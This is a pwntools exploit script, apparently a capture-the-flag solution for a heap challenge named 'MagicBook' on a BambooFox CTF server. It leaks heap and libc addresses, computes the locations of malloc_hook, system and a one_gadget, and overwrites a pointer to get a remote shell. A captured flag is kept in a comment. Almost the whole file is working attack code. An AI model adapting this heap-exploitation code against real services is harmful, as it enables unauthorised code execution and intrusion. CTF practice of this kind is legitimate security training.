from pwn import *

libc=ELF("libc.so.6-14c22be9aa11316f89909e4237314e009da38883")
# r=process('./MagicBook-3418103fe4b29055b77a4b6b68e3b171bd3be297',env={"LD_PRELOAD": "./libc.so.6-14c22be9aa11316f89909e4237314e009da38883"})
# gdb.attach(r)

#nc bamboofox.cs.nctu.edu.tw 58798
host = "bamboofox.cs.nctu.edu.tw"
port = 58798
r = remote(host,port)

#BAMBOOFOX{Hehehe...R3M3m6er_t0_s3T_Ni1_aFt3r_Fr3333333}


sleep(15)

def add(page,length,content):
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(str(page))
	r.recvuntil(":")
	r.sendline(str(length))
	r.recvuntil(":")
	r.sendline(content)
	r.recvuntil(":")




def free(page):
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(page))
	r.recvuntil(":")



def run(num):
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(num))
	r.recvuntil(":")

def leak(delim,page):
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(page))
	r.recvuntil(delim)
	leaa=r.recv(9)
	print "output : "+leaa
	print len(leaa)
	leaa=leaa.ljust(8,"\x00")
	init= hex(u64(leaa))
	ret="0x"+init[3:-2]
	#print hex(int(init,16))
	print ret
	r.recvuntil(":")
	return ret

print "[+] Leaking heapbase : "
add(0,128,"AAAA")
add(1,128,"BBBB")
add(2,128,"CCCC")
add(3,128,"AAAA")
free(0)
free(2)
add(0,128,"DDDDDDD")
leakk=leak("DDDDDDD",0)
heapbase=int(leakk,16)-0x180
print "heapbase :"+hex(heapbase)
add(2,128,"DDDDDDD")
free(3)
free(2)
free(1)
free(0)

print "[+] Leaking Libc : "
add(0,128,"AAAA")
add(1,128,"BBBB")
add(2,128,"CCCC")
free(0)
add(0,128,"DDDDDDD")
leakk=leak("DDDDDDD",0)

#local
#malloc=int(leakk,16)-3268136
malloc=int(leakk,16)-(3410504)
libc_base=malloc-libc.symbols['malloc']
#one_gadget=libc_base+0x3f2d6
one_gadget=libc_base+0x45216
malloc_hook = libc_base+libc.symbols['__malloc_hook']
system=libc_base+libc.symbols['system']
print "malloc :"+hex(malloc)
print "one gadget :"+hex(one_gadget)
print "malloc hook :"+hex(malloc_hook)
print "system :"+hex(system)

#clean heap
free(2)
free(1)
free(0)

# 0x6020a0 <list>:	0x0000000001bf3170	0x0000000001bf3170
# 0x6020b0 <list+16>:	0x0000000001bf3010	0x0000000001bf3220
#3 rd pointer


add(0,30,"X")
add(1,800,"T"*300)
add(2,500,"B"*300)
add(3,128,"X")

free(3)
free(2)
free(1)
free(0)
known_heap=heapbase+0x190
#add(1,900,"Q"*(96)+"P"*(900-112+16))
pop_rax_ret=0x0000000000035f98+libc_base
print "pop_rax_ret : "+hex(pop_rax_ret)
#add(1,900,"Q"*96+p64(one_gadget)*100)
rop=p64(pop_rax_ret)+p64(system)
#fake heap
# add(1,900,rop+"Q"*(96-len(rop)+48)+p64(known_heap)+p64(heapbase+0x220+32)+p64(0)+p64(0x91))

add(1,900,"Q"*(96+48)+p64(one_gadget))

print "[+] Get Shell "
r.sendline("3")
r.recvuntil(":")
r.sendline("3")
r.sendline("ls -al")


r.interactive()
